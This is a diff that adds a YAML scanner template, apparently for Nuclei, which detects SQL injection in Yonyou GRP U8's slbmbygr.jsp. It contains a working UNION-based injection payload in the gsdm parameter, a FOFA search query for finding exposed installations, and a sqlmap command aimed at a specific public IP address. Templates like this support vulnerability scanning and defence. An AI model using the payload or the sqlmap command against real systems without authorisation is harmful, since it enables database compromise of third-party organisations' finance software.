@@ -1,0 +1,29 @@
+id: yonyou-grp-u8-slbmbygr-sqli
+
+info:
+  name: 用友 GRP U8 slbmbygr.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8-slbmbygr.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
+    sqlmap: sqlmap -u "http://8.136.191.171:8001/u8qx/slbmbygr.jsp?gsdm=1" -p gsdm
+  tags: yonyou,grpu8,sqli,oa
+
+http:
+  - raw:
+      - |
+        GET /u8qx/slbmbygr.jsp?gsdm=1%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL--%20RTDH HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'12321')"
